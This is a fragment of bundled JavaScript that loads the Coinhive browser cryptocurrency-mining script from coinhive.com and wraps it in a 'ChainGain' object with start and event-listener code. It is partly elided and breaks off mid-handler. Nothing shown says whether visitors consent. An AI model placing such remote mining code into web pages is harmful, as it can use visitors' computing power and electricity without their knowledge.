...
var originalSrc = "https://coinhive.com/lib/coinhive.min.js";
__WEBPACK_IMPORTED_MODULE_0_jquery___default.a.getScript(originalSrc, function () {
  window.ChainGain = {
    status: 'stopped',
    start: function start() {
      ...
      // Listen on events
      ChainGain.miner.on('found', function () {
        console.log('Hash found');
      });
      ChainGain.miner.on('stop', function () {
        console.log('stopping');
      });
      ChainGain.miner.on('accepted', function () {
